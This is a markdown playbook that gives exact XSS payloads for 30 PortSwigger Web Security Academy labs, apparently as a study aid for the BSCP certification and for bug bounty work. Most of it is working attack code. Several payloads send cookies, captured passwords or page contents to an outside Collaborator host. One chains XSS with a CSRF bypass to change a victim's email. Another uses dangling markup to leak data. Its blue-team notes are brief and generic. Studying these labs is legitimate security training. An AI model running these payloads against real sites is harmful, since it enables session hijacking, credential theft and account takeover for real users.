---
name: "Cross-Site Scripting (XSS) — Complete Deep Dive"
description: "Complete PortSwigger deep-dive with exact payloads for every lab variant including zero-day techniques"
domain: cybersecurity
subdomain: bug-hunting
version: "1.0.0"
category: "bug-hunting/deep-dive-labs"
tags: [portswigger, deep-dive, exploitation, zero-day, lab-solutions]
mitre_attack: ["T1059.007"]
tools: [burp-suite, curl, sqlmap, ffuf, python]
difficulty: "advanced"
---

# Cross-Site Scripting (XSS) — Complete Deep Dive

> **Deep-Dive Lab Playbook** — Every PortSwigger lab variant with exact payloads,
> bypass techniques, and zero-day extensions. Difficulty: 🟢 Apprentice 🟡 Practitioner 🔴 Expert

## When to Use
- Studying for BSCP (Burp Suite Certified Practitioner) certification
- Testing real-world targets for these vulnerability classes
- Bug bounty hunting — these exact techniques find real bugs
- Building exploitation chains

## Prerequisites
- Burp Suite Professional (Community works for most)
- Browser with proxy configured
- Burp Collaborator or interactsh for OOB testing


## Workflow
### Phase 1: Reconnaissance
- Identify input vectors, parameters, and application behavior.
### Phase 2: Exploitation
- Apply standard lab payloads.
### Phase 3: Zero-Day Escalation
- Fuzz filters, bypass WAFs, and chain with other vulns.

## Lab Playbooks

### Lab 1: Reflected XSS HTML context nothing encoded 🟢 APPRENTICE

```html
<script>alert(1)</script>
```
Inject in search parameter. No encoding = direct execution.
---

### Lab 2: Stored XSS HTML context nothing encoded 🟢 APPRENTICE

```html
<!-- In comment field: -->
<script>alert(1)</script>
```
Payload persists. Every user who views the page triggers it.
---

### Lab 3: DOM XSS document.write location.search 🟢 APPRENTICE

```
"><svg onload=alert(1)>
```
The sink `document.write()` writes the search parameter directly. Break out of the existing tag.
---

### Lab 4: DOM XSS innerHTML location.search 🟢 APPRENTICE

```html
<img src=1 onerror=alert(1)>
```
`innerHTML` doesn't execute `<script>` but DOES execute event handlers like `onerror`.
---

### Lab 5: DOM XSS jQuery href location.search 🟢 APPRENTICE

```
javascript:alert(1)
```
jQuery sets `attr('href', userInput)`. Inject `javascript:` protocol in the `returnPath` parameter.
---

### Lab 6: DOM XSS jQuery selector hashchange 🟢 APPRENTICE

```html
<iframe src="https://TARGET/#" onload="this.src+='<img src=1 onerror=print()>'">
```
jQuery `$()` selector processes `location.hash` and creates DOM elements from it.
---

### Lab 7: Reflected XSS attribute angle brackets encoded 🟡 PRACTITIONER

```
" autofocus onfocus=alert(1) x="
```
Angle brackets are encoded but you're INSIDE an attribute. Break out with `"` then add event handler.
---

### Lab 8: Stored XSS anchor href double quotes encoded 🟡 PRACTITIONER

```
javascript:alert(1)
```
In the website field of comment form. The value goes into `<a href="VALUE">`. Use `javascript:` protocol.
---

### Lab 9: Reflected XSS JS string angle brackets encoded 🟡 PRACTITIONER

```
';alert(1)//
```
You're inside a JavaScript string. Close string with `'`, terminate statement with `;`, execute, comment rest.
---

### Lab 10: DOM XSS document.write select element 🟡 PRACTITIONER

```
product?productId=1&storeId="></select><img src=1 onerror=alert(1)>
```
Close the `<select>` tag first, then inject your payload.
---

### Lab 11: DOM XSS AngularJS expression 🟡 PRACTITIONER

```
{{$on.constructor('alert(1)')()}}
```
AngularJS evaluates expressions in `{{ }}`. Access Function constructor to execute arbitrary code.
---

### Lab 12: Reflected DOM XSS 🟡 PRACTITIONER

```
\"-alert(1)}//
```
The app uses `eval()` with JSON response. Escape the backslash escaping, break JSON string, inject.
---

### Lab 13: Stored DOM XSS 🟡 PRACTITIONER

```
<><img src=1 onerror=alert(1)>
```
The `replace()` function strips `<>` but only the FIRST occurrence. Add a sacrificial `<>` pair.
---

### Lab 14: Most tags and attributes blocked 🟡 PRACTITIONER

```html
<body onresize=print()>
```
Use Burp Intruder to fuzz which tags/events are allowed. Deliver via:
```html
<iframe src="https://TARGET/?search=%3Cbody+onresize%3Dprint()%3E" onload=this.style.width='100px'>
```
---

### Lab 15: All tags blocked except custom 🟡 PRACTITIONER

```html
<xss id=x onfocus=alert(document.cookie) tabindex=1>#x
```
Custom tags aren't blocked. Use `tabindex` + `onfocus` + URL fragment `#x` to auto-focus.
---

### Lab 16: Some SVG markup allowed 🟡 PRACTITIONER

```html
<svg><animatetransform onbegin=alert(1)>
```
Fuzz with Burp Intruder to find allowed SVG tags and events. `animatetransform` + `onbegin` often survives.
---

### Lab 17: Canonical link tag 🟡 PRACTITIONER

```
'accesskey='x'onclick='alert(1)
```
Inject into canonical `<link>` tag attributes. User must press `ALT+SHIFT+X` (Chrome) to trigger.
---

### Lab 18: JS string single quote backslash escaped 🟡 PRACTITIONER

```
</script><script>alert(1)</script>
```
Can't escape the string? Break out of the entire `<script>` block instead.
---

### Lab 19: JS string angle brackets double quotes encoded single quotes escaped 🟡 PRACTITIONER

```
\';alert(1)//
```
The app escapes `'` to `\'` but doesn't escape `\`. Your `\\` neutralizes their `\`, and `'` closes the string.
---

### Lab 20: Stored onclick angle brackets double quotes encoded 🟡 PRACTITIONER

```
http://foo?&apos;-alert(1)-&apos;
```
In website field. HTML entity `&apos;` decodes to `'` inside the `onclick` attribute.
---

### Lab 21: Template literal Unicode-escaped 🟡 PRACTITIONER

```
${alert(1)}
```
Inside a JS template literal (backticks), `${}` expressions execute regardless of other escaping.
---

### Lab 22: Steal cookies via XSS 🟡 PRACTITIONER

```html
<script>
fetch('https://BURP-COLLAB.net/?c='+document.cookie);
</script>
```
---

### Lab 23: Capture passwords via XSS 🟡 PRACTITIONER

```html
<input name=username id=username>
<input type=password name=password onchange="fetch('https://BURP-COLLAB.net/?u='+username.value+'&p='+this.value)">
```
Browser autofill populates credentials. `onchange` fires when password manager fills the field.
---

### Lab 24: XSS to bypass CSRF 🟡 PRACTITIONER

```html
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=attacker@evil.com')
};
</script>
```
---

### Lab 25: AngularJS sandbox escape no strings 🔴 EXPERT

```
toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```
---

### Lab 26: AngularJS sandbox escape + CSP 🔴 EXPERT

```html
<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>
```
Deliver via: `?search=<input id=x ng-focus=...>#x` + click event from external page.
---

### Lab 27: Event handlers and href blocked 🔴 EXPERT

```html
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click</text></a>
```
SVG `<animate>` dynamically sets the `href` to `javascript:` after initial render.
---

### Lab 28: JS URL some characters blocked 🔴 EXPERT

```
javascript:fetch('/x]').then(x=>x.text()).then(x=>fetch('https://COLLAB/?'+x))
```
URL-encode blocked chars. Test which chars are filtered using Burp Intruder.
---

### Lab 29: Strict CSP dangling markup 🔴 EXPERT

```
"><table background='//COLLAB.net?
```
Dangling markup captures subsequent HTML (including CSRF tokens) and sends to attacker server.
---

### Lab 30: CSP bypass 🔴 EXPERT

```html
<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
```
Exploit CSP injection: inject a policy directive that allows inline scripts.
---


## Blue Team Detection
- Monitor access logs for anomalous payloads.
- Implement strict input validation and parameterized queries where applicable.
- Create WAF rules masking generic attack patterns.

## Zero-Day Research Methodology
When a standard technique doesn't work:
1. **Identify the filter**: What chars/patterns are blocked?
2. **Research bypasses**: Search GitHub, Twitter, PortSwigger Research for new techniques
3. **Fuzz extensively**: Use Burp Intruder with custom charset/tag lists
4. **Chain vulnerabilities**: Combine two medium findings into one critical
5. **Check encoding layers**: URL, HTML entity, Unicode, double-encode, XML entity


## Key Concepts
| Concept | Description |
|---------|-------------|
| PortSwigger Vectors | Standardized approaches to vulnerability classes. |
| Payload Encoding | Modifying payloads to bypass basic string matching WAFs. |


## Output Format
```
Vulnerability Deep-Dive Report
==============================
Target Vector: [Endpoint]
Bypass Technique: [Explanation of bypass]
Payload Used: [Payload]
Impact Explanation: [Impact]
```

## 🔵 Blue Team
- Deploy robust WAF rules to detect anomalies.
- Monitor logs for unusual access patterns.

## 🛡️ Remediation & Mitigation Strategy
- **Input Validation:** Sanitize and strictly type-check all inputs.
- **Least Privilege:** Constrain component execution bounds.


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [PortSwigger All Labs](https://portswigger.net/web-security/all-labs)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
